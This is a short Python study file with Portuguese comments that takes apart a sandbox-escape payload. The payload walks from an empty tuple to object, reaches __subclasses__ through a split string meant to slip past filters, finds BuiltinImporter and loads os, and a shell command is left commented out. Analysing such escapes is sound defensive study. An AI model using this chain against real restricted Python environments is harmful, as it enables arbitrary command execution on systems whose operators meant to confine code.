
objeto_tupla = ().__class__.__mro__[1]
# __class__ retorna a classe do objeto: <class 'tuple'>
# __mro__ retorna uma tupla com a hierarquia de classes: (<class 'tuple'>, <class 'object'>)
# [1] Acessa o segundo elemento da tupla: <class 'object'>

lista_sub = objeto_tupla.__getattribute__(*[().__class__.__mro__[1]]+["__sub" + "classes__"])()
# <class 'object'>.__getattribute__ Chama um atributo interno da classe object
# (*[().__class__.__mro__[1]]+["__sub" + "classes__"]) Essa parte foi feita assim de propósito talvez para dificultar a leitura ou burlar defesas.
# (*[().__class__.__mro__[1]]+["__sub" + "classes__"]) == (().__class__.__mro__[1], "__subclasses__")
# Esse comando tras a lista de subclasses da classe raiz object.

"""
subclasses_list = object_class.__getattribute__(*[object_class] + ["__subclasses__"])() #<class 'object'>
print("SUBCLASSE LIST=>   ",subclasses_list)

builtin_importer = [d for d in subclasses_list if d.__name__ == "BuiltinImporter"][0]
print("BUILTINIMPORTER=>   ",builtin_importer)

os_module = builtin_importer.load_module("os")
print("OSMODULE=>   ",os_module)

#os_module.system("ipconfig")

a = []
print(a.__class__.__mro__[1].__getattribute__(a.__class__.__mro__[1],"__subclasses__")())

"""
